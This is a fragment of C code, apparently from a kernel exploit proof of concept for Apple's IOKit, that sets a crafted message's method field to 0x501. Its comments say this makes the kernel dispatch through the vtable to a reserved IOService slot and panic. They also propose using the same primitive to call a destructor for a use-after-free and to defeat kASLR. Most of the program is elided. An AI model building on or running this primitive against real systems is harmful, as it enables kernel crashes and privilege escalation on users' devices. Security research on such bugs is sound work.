...
int main(int argc, char** argv){
  ...
  // (if it is, then method-1 is used as an offset in to the vtable)
  // 0x501 is IOService::_RESERVEDIOService27 which will just kernel panic
  // but this is a really nice primitive, you could for example call the destructor
  // to get a UaF and try to get a kASLR defeat
  fm->method = 0x501;
  fm->zero_ = 0;
  fm->flags = 0;
  fm->count0 = 0;
